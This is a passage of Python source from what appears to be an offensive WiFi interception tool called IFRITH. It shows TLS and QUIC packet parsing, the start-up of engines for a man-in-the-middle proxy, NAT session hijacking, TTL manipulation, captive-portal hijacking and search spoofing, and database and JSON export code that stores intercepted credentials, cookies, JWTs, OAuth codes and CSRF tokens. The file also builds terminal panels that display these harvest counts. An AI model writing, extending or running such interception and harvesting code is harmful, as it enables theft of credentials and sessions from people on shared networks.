                try: PSK_BINDER.observe(src_ip, sni)
                except Exception: pass
            if info.get("session_ticket") and TLS_HIJACK:
                try:
                    TLS_HIJACK.observe(src_ip, sni,
                                        info.get("session_ticket_data"))
                except Exception: pass
            if sni:
                with STATE.lock:
                    sd2 = STATE.devices.get(src_ip)
                    if sd2 is not None:
                        _bump_site(sd2, sni,
                                    CONFIG.get("per_device_sites_max", 150))
                        sd2.services.add(f"SNI:{sni[:40]}")
                        app = domain_to_app(sni)
                        if app: _bump_app(sd2, app, weight=2.0)
                    if not _dns_dedup_check(src_ip, sni):
                        STATE.dns_events.append((ts, src_ip, sni, "SNI",
                                                  None))
                    STATE.dirty += 1
                if DNSBL_ENGINE:
                    try: DNSBL_ENGINE.observe(src_ip, sni, "sni")
                    except Exception: pass
                if CT_RANKER:
                    try: CT_RANKER.observe(src_ip, dst_ip, sni)
                    except Exception: pass
                if (CAPTIVE_HIJACK and CAPTIVE_HIJACK.match(sni)
                    and PORTAL):
                    with STATE.lock:
                        STATE.captive_hits.append((time.time(), src_ip,
                                                    "sni", sni))
                        STATE.dirty += 1
                if SEARCH_SPOOF and SEARCH_SPOOF.is_search(sni):
                    with STATE.lock:
                        STATE.search_hits.append((ts, src_ip, sni))
                        STATE.dirty += 1
                if TLS_DRIFT:
                    try: TLS_DRIFT.observe(src_ip, info.get("extensions"))
                    except Exception: pass
                if BSSID_TRACE:
                    with STATE.lock:
                        sd3 = STATE.devices.get(src_ip)
                        mac = sd3.mac if sd3 else None
                    if mac and mac != "?":
                        try:
                            BSSID_TRACE.observe(mac,
                                CONFIG.get("bssid") or "?")
                        except Exception: pass
                if WIFIDIRECT:
                    try: WIFIDIRECT.lookup(sni)
                    except Exception: pass
            if ja3:
                with STATE.lock:
                    sd2 = STATE.devices.get(src_ip)
                    if (sd2 is not None
                        and len(sd2.ja3) < CONFIG.get("per_device_ja3_max",
                                                       20)):
                        sd2.ja3[ja3] = (ts, info.get("ja3_raw", ""))
                    label = _JA3_DB.get(ja3, (None, None))[0]
                    if label and sd2 is not None:
                        sd2.services.add(f"JA3:{label}")
                    STATE.ja3_events.append((ts, src_ip, dst_ip, tcp_sport,
                                              tcp_dport, ja3,
                                              info.get("ja3_raw", "")))
                    STATE.ja3_fp_count += 1
                    STATE.dirty += 1
                if BASELINE and sni:
                    try: BASELINE.update(src_ip, sni, ja3)
                    except Exception: pass
                if CORRELATOR:
                    with STATE.lock:
                        d = STATE.devices.get(src_ip)
                        mac = d.mac if d else None
                    if mac:
                        try: CORRELATOR.observe(mac, None, ja3)
                        except Exception: pass

    if (proto_seen == "TCP" and tcp_payload and tcp_sport == 443):
        info_s = _parse_server_hello_py(tcp_payload)
        ja3s = info_s.get("ja3s")
        if ja3s:
            with STATE.lock:
                sd = STATE.devices.get(src_ip)
                if sd is None:
                    sd = Device(src_ip, vendor="?")
                    STATE.devices[src_ip] = sd
                if len(sd.ja3s) < CONFIG.get("per_device_ja3_max", 20):
                    sd.ja3s[ja3s] = (ts, info_s.get("ja3s_raw", ""))
                STATE.ja3_events.append((ts, src_ip, dst_ip, tcp_sport,
                                          tcp_dport, ja3s,
                                          info_s.get("ja3s_raw", "")))
                STATE.ja3_fp_count += 1
                STATE.dirty += 1
        if info_s.get("ja4s"):
            _ja4_on_fp({
                "stream": hash((src_ip, tcp_sport, dst_ip, tcp_dport))
                          & 0x7fffffff,
                "src": src_ip, "dst": dst_ip,
                "srcport": tcp_sport, "dstport": tcp_dport,
                "JA4S": info_s.get("ja4s"),
                "hl": "tls", "ts": time.time(),
            }, "ja4s")

    if proto_seen == "UDP" and (udp_dport == 443 or udp_sport == 443):
        with STATE.lock:
            sd = STATE.devices.get(src_ip)
            if sd is not None: sd.services.add("QUIC")
            STATE.dirty += 1
        if udp_payload and len(udp_payload) > 20:
            q = _parse_quic_initial_py(udp_payload)
            if q.get("is_initial"):
                with STATE.lock:
                    STATE.quic_initials.append((time.time(), src_ip, dst_ip,
                                                 q.get("dcid"),
                                                 q.get("scid")))
                    STATE.dirty += 1
                if QUIC_CONNID and q.get("dcid"):
                    try:
                        QUIC_CONNID.observe(bytes.fromhex(q["dcid"]), src_ip)
                    except Exception: pass
                if QUIC_RETRY and q.get("token"):
                    try: QUIC_RETRY.observe(q["token"], src_ip)
                    except Exception: pass
            qr = _parse_quic_retry_py(udp_payload)
            if qr.get("is_retry") and QUIC_RETRY and qr.get("token"):
                try: QUIC_RETRY.observe(qr["token"], src_ip)
                except Exception: pass
        if QUIC_DOWNGRADE and QUIC_DOWNGRADE.should_block(src_ip):
            QUIC_DOWNGRADE.record_block(src_ip)

    enc = None
    if proto_seen == "TCP":
        enc = _detect_encrypted_dns(src_ip, dst_ip, tcp_sport, tcp_dport,
                                     "TCP")
    elif proto_seen == "UDP":
        enc = _detect_encrypted_dns(src_ip, dst_ip, udp_sport, udp_dport,
                                     "UDP")
    if enc:
        svc_label, resolver = enc
        with STATE.lock:
            sd = STATE.devices.get(src_ip)
            if sd is not None:
                sd.services.add(svc_label)
                sd.services.add(f"{svc_label}:{resolver[:24]}")
            STATE.encrypted_dns[src_ip] = f"{svc_label}: {resolver}"
            STATE.dirty += 1

    if MODULE_REG:
        try: MODULE_REG.fire("on_frame", src_ip, dst_ip, proto_seen, size)
        except Exception: pass
    if FORWARDER:
        try: FORWARDER.submit(frame_bytes, src_ip, dst_ip, proto_seen, size)
        except Exception: pass

    if udp_payload is not None:
        try:
            if udp_sport == 53 or udp_dport == 53:
                handle_dns(udp_payload, src_ip, ts)
            elif udp_sport == 5353 or udp_dport == 5353:
                handle_mdns(udp_payload, src_ip, ts)
            elif udp_sport == 1900 or udp_dport == 1900:
                handle_ssdp(udp_payload, src_ip, ts)
            elif udp_sport == 123 or udp_dport == 123:
                handle_ntp(src_ip)
        except Exception: pass

def _wire_part2_engines(real, mitm_choice, mitm_possible, proxy_mode):
    global KERNEL_SNAP, SIGNED_LOG, PCAP_ROTATE
    global FLOW_SHAPER, KALMAN_ARP, TTL_MANIP
    global NAT_HIJACK, CROSS_APP_CORR, BEHAVIOR_TIMING, REFRESH_WATCH
    global PSK_BINDER, WS_CTRL, ECH_OUTER, TLS_DRIFT, QUIC_CONNID
    global H2_PUSH, QUIC_RETRY, PROBE_FP, BSSID_TRACE, WIFIDIRECT
    global ROUTER_FP, RULE_ENGINE, POLICY_MGR
    global SQL_STATE, LIVE_MIRROR, JA4S_FID, COOKIE_GRAPH
    global DNS_CHAN_EST, DNSBL_ENGINE
    global MITM_PROXY, FORWARDER

    if CONFIG.get("dnsbl_enabled"):
        DNSBL_ENGINE = DNSBLEngine(); DNSBL_ENGINE.start()

    if CONFIG.get("kernel_snap_enabled"):
        KERNEL_SNAP = KernelSnapshot()
        if KERNEL_SNAP.start():
            try: KERNEL_SNAP.take(CONFIG.get("iface"))
            except Exception: pass

    if CONFIG.get("signed_log_enabled"):
        SIGNED_LOG = SignedEventLog(); SIGNED_LOG.start()

    if CONFIG.get("pcap_rotate_enabled") and CAPTURE:
        PCAP_ROTATE = PCAPRotator(CONFIG["iface"], CAPTURE)
        PCAP_ROTATE.start()

    if CONFIG.get("flow_shaper_enabled"):
        FLOW_SHAPER = FlowShaper(); FLOW_SHAPER.start()
        FLOW_SHAPER.policy_prefix("0.0.0.0", 2000000, 200000)

    if CONFIG.get("kalman_arp_enabled"):
        KALMAN_ARP = KalmanARPScheduler(); KALMAN_ARP.start()

    if CONFIG.get("ttl_manip_enabled"):
        TTL_MANIP = TTLManipEngine(CONFIG["iface"], CONFIG["my_mac"])
        TTL_MANIP.start()
        if mitm_choice and mitm_possible:
            for d in real:
                if d.mac and d.mac != "?":
                    TTL_MANIP.set(d.mac, 64)

    if CONFIG.get("nat_hijack_enabled"):
        NAT_HIJACK = NATSessionHijack(CONFIG["iface"], CONFIG["my_mac"])
        NAT_HIJACK.start()

    if CONFIG.get("cross_app_corr_enabled"):
        CROSS_APP_CORR = CrossAppCorrelator(); CROSS_APP_CORR.start()

    if CONFIG.get("behavioral_timing_enabled"):
        BEHAVIOR_TIMING = BehavioralTiming(); BEHAVIOR_TIMING.start()

    if CONFIG.get("refresh_token_enabled"):
        REFRESH_WATCH = RefreshTokenWatcher(); REFRESH_WATCH.start()

    if CONFIG.get("psk_binder_enabled"):
        PSK_BINDER = PSKBinderInspector(); PSK_BINDER.start()

    if CONFIG.get("ws_ctrl_enabled"):
        WS_CTRL = WSControlInspector(); WS_CTRL.start()

    if CONFIG.get("ech_outer_enabled"):
        ECH_OUTER = ECHOuterSNIMap(); ECH_OUTER.start()

    if CONFIG.get("tls_drift_enabled"):
        TLS_DRIFT = TLSDriftTracker(); TLS_DRIFT.start()

    if CONFIG.get("quic_connid_enabled"):
        QUIC_CONNID = QUICConnIDTracker(); QUIC_CONNID.start()

    if CONFIG.get("h2_push_enabled"):
        H2_PUSH = H2PushAbuseDetector(); H2_PUSH.start()

    if CONFIG.get("quic_retry_enabled"):
        QUIC_RETRY = QUICRetryCorrelator(); QUIC_RETRY.start()

    if CONFIG.get("probe_fp_enabled"):
        PROBE_FP = ProbeRequestFingerprint(CONFIG["iface"]); PROBE_FP.start()

    if CONFIG.get("bssid_trace_enabled"):
        BSSID_TRACE = BSSIDTransitionTracer(); BSSID_TRACE.start()

    if CONFIG.get("wifidirect_lookup_enabled"):
        WIFIDIRECT = WiFiDirectServiceLookup(); WIFIDIRECT.start()

    if CONFIG.get("router_fp_enabled"):
        ROUTER_FP = PassiveRouterFingerprint(); ROUTER_FP.start()

    if CONFIG.get("rule_engine_enabled"):
        RULE_ENGINE = RuleEngine(); RULE_ENGINE.start()

    if CONFIG.get("policy_mgr_enabled"):
        POLICY_MGR = PolicyProfileManager(); POLICY_MGR.start()

    if CONFIG.get("sql_state_enabled"):
        SQL_STATE = StateQueryLanguage(); SQL_STATE.start()

    if CONFIG.get("live_mirror_enabled"):
        LIVE_MIRROR = LiveMirror(); LIVE_MIRROR.start()

    if CONFIG.get("ja4s_fidelity_enabled"):
        JA4S_FID = JA4SFidelityChecker(); JA4S_FID.start()

    if CONFIG.get("cookie_graph_enabled"):
        COOKIE_GRAPH = CookieScopeGraph(); COOKIE_GRAPH.start()

    if CONFIG.get("dns_channel_est_enabled"):
        DNS_CHAN_EST = DNSChannelEstimator(); DNS_CHAN_EST.start()

    if proxy_mode in ("B", "C"):
        MITM_PROXY = MITMProxy(CONFIG["iface"], CONFIG["my_ip"],
                                CONFIG["my_mac"], CONFIG["gateway_ip"],
                                CONFIG["gateway_mac"])
        if not MITM_PROXY.start():
            console.print("[yellow]MITM proxy failed to start[/]")
            MITM_PROXY = None

    if (CONFIG.get("userspace_forwarder_enabled")
        and mitm_choice and mitm_possible):
        FORWARDER = UserSpaceForwarder(CONFIG["iface"], CONFIG["my_mac"],
                                        CONFIG["gateway_mac"])
        FORWARDER.start()

class DB:
    def __init__(self, path):
        self.path = path; self.conn = None
        self.lock = threading.Lock()
        try:
            self.conn = sqlite3.connect(path, check_same_thread=False)
        except Exception:
            alt = os.path.join(OUTPUT_DIR, "ifrith.db")
            self.conn = sqlite3.connect(alt, check_same_thread=False)
            self.path = alt
        c = self.conn.cursor()
        c.execute("""CREATE TABLE IF NOT EXISTS session(
            ts REAL, ssid TEXT, bssid TEXT, iface TEXT, my_ip TEXT, gw TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS devices(
            ip TEXT PRIMARY KEY, mac TEXT, vendor TEXT, hostname TEXT,
            first REAL, last REAL, up INT, down INT, pkts INT, services TEXT,
            mitm INT, proxy_http INT, proxy_https INT, proxy_pinned INT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS dns(
            ts REAL, src TEXT, domain TEXT, qtype TEXT, answer TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS flows(
            ts REAL, src TEXT, sport INT, dst TEXT, dport INT,
            proto TEXT, pkts INT, bytes INT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS ja4(
            ts REAL, ip TEXT, src TEXT, dst TEXT, srcport INT, dstport INT,
            kind TEXT, value TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS ja3(
            ts REAL, src TEXT, dst TEXT, sport INT, dport INT,
            digest TEXT, raw TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS tokens(
            ts REAL, device TEXT, kind TEXT, value TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS credentials(
            ts REAL, host TEXT, body TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS cookies(
            ts REAL, host TEXT, name TEXT, value TEXT, direction TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS jwts(
            ts REAL, host TEXT, header TEXT, payload TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS oauth(
            ts REAL, host TEXT, code TEXT, state TEXT, method TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS csrf(
            ts REAL, host TEXT, field TEXT, value TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS http_requests(
            ts REAL, host TEXT, method TEXT, path TEXT,
            headers TEXT, body BLOB)""")
        c.execute("""CREATE TABLE IF NOT EXISTS http_responses(
            ts REAL, status INT, headers TEXT, body BLOB)""")
        c.execute("""CREATE TABLE IF NOT EXISTS alerts(
            ts REAL, message TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS events(
            ts REAL, kind TEXT, src TEXT, text TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS dnsbl(
            ts REAL, src TEXT, name TEXT, matched TEXT, kind TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS mitm_flows(
            ts REAL, src TEXT, dst TEXT, sport INT, dport INT,
            proto TEXT, sni TEXT, host TEXT, method TEXT, path TEXT,
            status INT, bytes_in INT, bytes_out INT, mode TEXT,
            outcome TEXT)""")
        c.execute("INSERT INTO session VALUES(?,?,?,?,?,?)",
                  (time.time(), CONFIG.get("ssid"), CONFIG.get("bssid"),
                   CONFIG.get("iface"), CONFIG.get("my_ip"),
                   CONFIG.get("gateway_ip")))
        self.conn.commit()
    def flush(self):
        with self.lock:
            c = self.conn.cursor()
            with STATE.lock:
                dns_snap = list(STATE.dns_events)[-400:]
                dev_snap = [(d.ip, d.mac, d.vendor, d.hostname,
                             d.first_seen, d.last_seen, d.up, d.down, d.pkts,
                             ",".join(sorted(d.services)),
                             1 if d.mitm else 0,
                             d.proxy_http_flows, d.proxy_https_flows,
                             d.proxy_pinned)
                            for d in STATE.devices.values()]
                flow_snap = [(m["last"], s, sp, dd, dp, pr, m["pkts"],
                              m["bytes"])
                             for (s, sp, dd, dp, pr), m in STATE.flows.items()]
                ja4_snap = list(STATE.ja4_events)[-400:]
                ja3_snap = list(STATE.ja3_events)[-400:]
                tok_snap = list(STATE.tokens)[-400:]
                cred_snap = list(STATE.credentials)[-200:]
                cookie_snap = list(STATE.cookies)[-400:]
                jwt_snap = list(STATE.jwts)[-200:]
                oauth_snap = list(STATE.oauth_flows)[-200:]
                csrf_snap = list(STATE.csrf_tokens)[-200:]
                req_snap = list(STATE.http_requests)[-200:]
                resp_snap = list(STATE.http_responses)[-200:]
                al_snap = list(STATE.alerts)[-400:]
                ev_snap = list(STATE.events)[-400:]
                dnsbl_snap = list(STATE.dnsbl_hits)[-400:]
                mitm_snap = list(STATE.mitm_flows)[-400:]
            for row in dns_snap:
                c.execute("INSERT OR IGNORE INTO dns VALUES(?,?,?,?,?)", row)
            for row in dev_snap:
                c.execute("""INSERT OR REPLACE INTO devices
                             VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", row)
            for row in flow_snap:
                c.execute("INSERT INTO flows VALUES(?,?,?,?,?,?,?,?)", row)
            for row in ja4_snap:
                c.execute("INSERT INTO ja4 VALUES(?,?,?,?,?,?,?,?)", row)
            for row in ja3_snap:
                c.execute("INSERT INTO ja3 VALUES(?,?,?,?,?,?,?)", row)
            for row in tok_snap:
                c.execute("INSERT INTO tokens VALUES(?,?,?,?)", row)
            for row in cred_snap:
                c.execute("INSERT INTO credentials VALUES(?,?,?)", row)
            for row in cookie_snap:
                c.execute("INSERT INTO cookies VALUES(?,?,?,?,?)", row)
            for ts, host, jwt, raw in jwt_snap:
                c.execute("INSERT INTO jwts VALUES(?,?,?,?)",
                          (ts, host, json.dumps(jwt.get("header", {})),
                           json.dumps(jwt.get("payload", {}))))
            for row in oauth_snap:
                c.execute("INSERT INTO oauth VALUES(?,?,?,?,?)", row)
            for row in csrf_snap:
                c.execute("INSERT INTO csrf VALUES(?,?,?,?)", row)
            for req in req_snap:
                c.execute("INSERT INTO http_requests VALUES(?,?,?,?,?,?)",
                          (req["ts"], req.get("host", ""),
                           req.get("method", ""),
                           req.get("path", ""),
                           json.dumps(req.get("headers", {})),
                           req.get("body", b"")))
            for r in resp_snap:
                c.execute("INSERT INTO http_responses VALUES(?,?,?,?)",
                          (r["ts"], r.get("status", 0),
                           json.dumps(r.get("headers", {})),
                           r.get("body", b"")))
            for row in al_snap:
                c.execute("INSERT INTO alerts VALUES(?,?)", row)
            for row in ev_snap:
                c.execute("INSERT INTO events VALUES(?,?,?,?)", row)
            for row in dnsbl_snap:
                c.execute("INSERT INTO dnsbl VALUES(?,?,?,?,?)", row)
            for row in mitm_snap:
                try:
                    c.execute("""INSERT INTO mitm_flows VALUES
                                  (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", row)
                except Exception: pass
            self.conn.commit()
    def close(self):
        try:
            self.flush(); self.conn.close()
        except Exception: pass

def db_loop(db):
    while STATE.running:
        for _ in range(20):
            if not STATE.running: break
            time.sleep(0.5)
        try: db.flush()
        except Exception: pass

def write_outputs():
    try:
        with STATE.lock:
            dns_snap = list(STATE.dns_events)
            ja4_snap = list(STATE.ja4_events)
            ja3_snap = list(STATE.ja3_events)
            tokens_snap = list(STATE.tokens)
            creds_snap = list(STATE.credentials)
            cookies_snap = list(STATE.cookies)
            jwts_snap = list(STATE.jwts)
            oauth_snap = list(STATE.oauth_flows)
            csrf_snap = list(STATE.csrf_tokens)
            reqs_snap = list(STATE.http_requests)
            al_snap = list(STATE.alerts)
            ev_snap = list(STATE.events)
            dnsbl_snap = list(STATE.dnsbl_hits)
            mitm_snap = list(STATE.mitm_flows)
        path = os.path.join(OUTPUT_DIR, "ifrith_export.json")
        with open(path, "w") as f:
            json.dump({
                "dns": dns_snap[-2000:],
                "ja4": ja4_snap[-2000:],
                "ja3": ja3_snap[-2000:],
                "tokens": tokens_snap[-2000:],
                "credentials": creds_snap[-2000:],
                "cookies": cookies_snap[-2000:],
                "jwts": [{"ts": t, "host": h, "payload": p}
                          for t, h, _j, _r in jwts_snap[-500:]],
                "oauth": oauth_snap[-500:],
                "csrf": csrf_snap[-500:],
                "http_requests": [{"ts": r["ts"], "host": r.get("host", ""),
                                    "method": r.get("method", ""),
                                    "path": r.get("path", ""),
                                    "headers": r.get("headers", {}),
                                    "body_len": len(r.get("body", b""))}
                                   for r in reqs_snap[-2000:]],
                "alerts": al_snap[-2000:],
                "events": ev_snap[-2000:],
                "dnsbl_hits": dnsbl_snap[-2000:],
                "mitm_flows": mitm_snap[-2000:],
                "config": {k: CONFIG.get(k) for k in
                            ("iface", "my_ip", "gateway_ip",
                             "ssid", "bssid")},
            }, f, default=str, indent=2)
        console.print(f"[green]IFRITH export:[/] {path}")
    except Exception as e:
        console.print(f"[red]IFRITH export failed:[/] {e}")

_PANEL_CACHE = {}
_PANEL_CACHE_LOCK = threading.RLock()

def _panel_cached(name, fn):
    now = time.time()
    with _PANEL_CACHE_LOCK:
        entry = _PANEL_CACHE.get(name)
        if entry and (now - entry[0]) < CONFIG.get("panel_cache_ttl_s", 1.0):
            return entry[1]
    panel = _safe(fn)
    with _PANEL_CACHE_LOCK:
        _PANEL_CACHE[name] = (now, panel)
    return panel

def _safe(fn, *a, **kw):
    try: return fn(*a, **kw)
    except Exception as e:
        return Panel(f"[red]panel error:[/] {type(e).__name__}: {e}",
                     border_style="red")

def _base_table():
    return Table(expand=True, show_edge=False, pad_edge=False,
                 padding=(0, 1), header_style="bold cyan")

def panel_status():
    with STATE.lock:
        pk = STATE.pkt_count; by = STATE.byte_count; nd = len(STATE.devices)
        ja4n = STATE.ja4_fp_count; ja3n = STATE.ja3_fp_count
        tk = len(STATE.tokens); cr = len(STATE.credentials)
        http_n = len(STATE.http_requests)
        tls_n = len(STATE.tls_decrypted)
        dnsbl_n = len(STATE.dnsbl_hits)
        dnsbl_dev = len(STATE.dnsbl_devices)
        ps = dict(STATE.proxy_stats)
    frames = CAPTURE.frames_seen if CAPTURE else 0
    W = _term_width()
    ssid = (CONFIG["ssid"] or "?")[:24]
    if MITM_ENGINE and MITM_ENGINE.running:
        mode = "MITM"; mode_color = "magenta"
        mitm_suffix = f" tgt:{len(MITM_ENGINE.targets)}"
    else:
        mode = "CLIENT"; mode_color = "cyan"; mitm_suffix = ""
    proxy_state = "ON" if (MITM_PROXY and MITM_PROXY.running) else "off"
    proxy_color = "magenta" if (MITM_PROXY and MITM_PROXY.running) else "dim"
    marks = []
    if JA4_ENGINE and JA4_ENGINE.running:
        marks.append(f"[bold cyan]JA4:{ja4n}[/]")
    if ja3n: marks.append(f"[bold blue]JA3:{ja3n}[/]")
    if tk: marks.append(f"[bold magenta]T:{tk}[/]")
    if cr: marks.append(f"[bold red]C:{cr}[/]")
    if http_n: marks.append(f"[bold green]H:{http_n}[/]")
    if tls_n: marks.append(f"[bold yellow]TLS:{tls_n}[/]")
    if dnsbl_n: marks.append(f"[bold red]DNSBL:{dnsbl_n}[/]")
    if ps.get("http") or ps.get("https"):
        marks.append(f"[bold magenta]P:{ps.get('http',0)}/"
                      f"{ps.get('https',0)}[/]")
    if ps.get("pinned"):
        marks.append(f"[bold red]PIN:{ps['pinned']}[/]")
    ja_mark = "  " + " ".join(marks) if marks else ""
    if W >= 110:
        line1 = (f"[bold cyan]WiFi[/] SSID:[bold]{ssid}[/]  "
                 f"BSSID:{CONFIG['bssid'] or '?'}  "
                 f"Ch:{CONFIG['channel'] or '?'}  "
                 f"Sig:{CONFIG['signal'] or '?'}dBm  "
                 f"Enc:{CONFIG['encryption'] or '?'}  "
                 f"[{mode_color}]{mode}{mitm_suffix}[/]  "
                 f"[{proxy_color}]PROXY:{proxy_state}[/]{ja_mark}")
    else:
        line1 = (f"[bold cyan]WiFi[/] [bold]{ssid}[/]  "
                 f"Ch:{CONFIG['channel'] or '?'}  "
                 f"[{mode_color}]{mode}{mitm_suffix}[/]  "
                 f"[{proxy_color}]PROXY:{proxy_state}[/]{ja_mark}")
    line2 = (f"[green]YOU[/]: {CONFIG['my_ip']}   "
             f"[yellow]GW[/]: {CONFIG['gateway_ip']} "
             f"({CONFIG.get('gateway_mac') or '?'})")
    line3 = (f"{CONFIG['iface']}  Up:{int(time.time()-STATE.start)}s  "
             f"Frames:{frames}  Pkts:{pk}  {pretty_bytes(by)}  Dev:{nd}  "
             f"DNSBL:{dnsbl_dev}  "
             f"Proxy: {ps.get('active',0)} act / {ps.get('errors',0)} err")
    line4 = "[dim]↑/↓ j/k scroll · J/K PgUp/PgDn · g/G top/bot · q/Ctrl+X exit[/]"
    return Panel(f"{line1}\n{line2}\n{line3}\n{line4}",
                 border_style="red",
                 title=f"[bold bright_red]{TOOL_NAME}[/]",
                 subtitle=f"[dim]by {TOOL_AUTHOR}[/]")

def panel_devices():
    W = _term_width(); t = _base_table()
    if W >= 140:
        t.add_column("Role"); t.add_column("IP", width=15)
        t.add_column("MAC", ratio=1); t.add_column("Vendor", ratio=1)
        t.add_column("Up", width=9, justify="right")
        t.add_column("Down", width=9, justify="right")
        t.add_column("MITM", width=5)
        t.add_column("H/HS", width=8)
        t.add_column("Apps", ratio=2)
    else:
        t.add_column("R", width=3); t.add_column("IP", width=18)
        t.add_column("Up/Down", width=15, justify="right")
        t.add_column("MITM", width=5)
        t.add_column("H/HS", width=8)
        t.add_column("Apps", ratio=1)
    real = _count_real_devices()
    def _key(d):
        if _is_me(d.ip): return (0, -d.bytes)
        if _is_gw(d.ip): return (1, -d.bytes)
        return (2, -d.bytes)
    rows = sorted(real, key=_key)[:14]; total = len(real)
    for d in rows:
        top_apps = _top_apps(d, n=2)
        app_str = ", ".join(a for a, _ in top_apps) if top_apps else ""
        svcs = ",".join(sorted(d.services))
        disp = (app_str if app_str else svcs[:40])
        mitm_mark = "[magenta]Y[/]" if d.mitm else "[dim]·[/]"
        hhs = f"{d.proxy_http_flows}/{d.proxy_https_flows}"
        if d.proxy_pinned: hhs += f"[red]!{d.proxy_pinned}[/]"
        if W >= 140:
            t.add_row(role_of(d.ip), d.ip, d.mac[:17], d.vendor[:18],
                      pretty_bytes(d.up), pretty_bytes(d.down),
                      mitm_mark, hhs, disp[:50])
        else:
            t.add_row(role_of_short(d.ip), d.ip,
                      f"{pretty_bytes(d.up)}/{pretty_bytes(d.down)}",
                      mitm_mark, hhs, disp[:24])
    ncols = len(t.columns)
    for _ in range(max(3, 14 - len(rows))): t.add_row(*([""] * ncols))
    return Panel(t, title=f"[bold cyan]DEVICES[/] [dim]({total})[/]",
                 border_style="cyan")

def panel_flows():
    t = _base_table()
    t.add_column("Dir", width=11); t.add_column("Src", ratio=2)
    t.add_column("Dst", ratio=2); t.add_column("SP/DP", width=11)
    t.add_column("P", width=4); t.add_column("Bytes", width=9)
    with STATE.lock:
        fs = sorted(STATE.flows.items(), key=lambda kv: -kv[1]["bytes"])[:14]
        snap = [((s, sp, d, dp, pr), m["pkts"], m["bytes"])
                for (s, sp, d, dp, pr), m in fs]
    for (s, sp, d, dp, pr), pkts, by in snap:
        t.add_row(dir_of(s, d), _tagged_ip(s, True), _tagged_ip(d, True),
                  f"{sp}/{dp}", pr, pretty_bytes(by))
    ncols = len(t.columns)
    for _ in range(max(3, 14 - len(snap))): t.add_row(*([""] * ncols))
    title = ("[bold magenta]ALL FLOWS[/] [dim](via MITM)[/]"
             if (MITM_ENGINE and MITM_ENGINE.running)
             else "[bold magenta]TOP FLOWS[/] [dim](YOU only)[/]")
    return Panel(t, title=title, border_style="magenta")

def panel_dns():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Domain / Service", ratio=3); t.add_column("Type", width=5)
    t.add_column("App", ratio=2); t.add_column("Answer", ratio=1)
    with STATE.lock: raw = list(STATE.dns_events)
    if CONFIG.get("hide_ipv6", False):
        raw = [e for e in raw if "." in e[1]]
    ev = raw[-200:]
    for ts, src, dom, q, ans in reversed(ev):
        tstr = datetime.fromtimestamp(ts).strftime("%H:%M:%S")
        dev = _tagged_ip(src, True)
        friendly = None
        if q == "mDNS" or dom.startswith("_") or "._sub." in dom:
            friendly = _mdns_friendly(dom)
        if friendly:
            domain_disp = friendly; app_disp = "mDNS"
        else:
            domain_disp = dom; app_disp = domain_to_app(dom) or ""
        t.add_row(tstr, dev, domain_disp, q, app_disp, (ans or ""))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]waiting…[/]",
                  *([" "] * (len(t.columns) - 2)))
    return Panel(t, title=f"[bold yellow]DNS / SNI / mDNS[/] [dim]({len(ev)})[/]",
                 border_style="yellow")

def panel_dnsbl():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Domain", ratio=3); t.add_column("Matched", ratio=2)
    t.add_column("Kind", width=6)
    with STATE.lock: hits = list(STATE.dnsbl_hits)[-80:]
    for ts, src, name, matched, kind in reversed(hits):
        tstr = datetime.fromtimestamp(ts).strftime("%H:%M:%S")
        t.add_row(tstr, _tagged_ip(src, True), str(name)[:60],
                  str(matched)[:40], str(kind))
    if not hits:
        t.add_row("[dim]—[/]", "[dim]no DNSBL hits[/]", "[dim]—[/]",
                  "[dim]—[/]", "[dim]—[/]")
    with STATE.lock:
        n = len(STATE.dnsbl_hits)
        devs = len(STATE.dnsbl_devices)
        doms = len(STATE.dnsbl_domains)
    return Panel(t, title=f"[bold red]DNSBL HITS[/] [dim]({n} hits, "
                          f"{devs} devs, {doms} doms)[/]",
                 border_style="red")

def panel_dnsbl_devices():
    t = _base_table()
    t.add_column("Device", ratio=2); t.add_column("Hits", width=8)
    t.add_column("Recent domains", ratio=5)
    with STATE.lock:
        devs = sorted(STATE.dnsbl_devices.items(), key=lambda kv: -kv[1])
        recent = defaultdict(list)
        for ts, src, name, matched, kind in STATE.dnsbl_hits:
            if len(recent[src]) < 5:
                recent[src].append(name)
    for src, n in devs[:20]:
        t.add_row(_tagged_ip(src, True), str(n),
                  ", ".join(recent[src])[:140])
    if not devs:
        t.add_row("[dim]—[/]", "[dim]no hits[/]", "[dim]waiting…[/]")
    return Panel(t, title="[bold red]DNSBL DEVICES[/]", border_style="red")

def panel_dnsbl_domains():
    t = _base_table()
    t.add_column("Domain", ratio=3); t.add_column("Hits", width=8)
    with STATE.lock:
        doms = sorted(STATE.dnsbl_domains.items(),
                      key=lambda kv: -kv[1])[:40]
    for dom, n in doms:
        t.add_row(str(dom)[:80], str(n))
    if not doms:
        t.add_row("[dim]no hits[/]", "[dim]—[/]")
    return Panel(t, title="[bold red]DNSBL DOMAINS[/]", border_style="red")

def panel_dnsbl_whitelist():
    t = _base_table()
    t.add_column("#", width=5); t.add_column("Domain", ratio=5)
    for i, d in enumerate(_DNSBL_ORDER[:80], 1):
        t.add_row(str(i), d)
    if not _DNSBL_ORDER:
        t.add_row("[dim]—[/]", "[dim]dnsbl_whitelist.txt not loaded[/]")
    return Panel(t, title=f"[bold red]DNSBL WHITELIST ({len(_DNSBL)})[/]",
                 border_style="red")

def panel_mitm_proxy():
    t = _base_table()
    t.add_column("Setting", ratio=2); t.add_column("Value", ratio=3)
    if MITM_PROXY:
        t.add_row("proxy status",
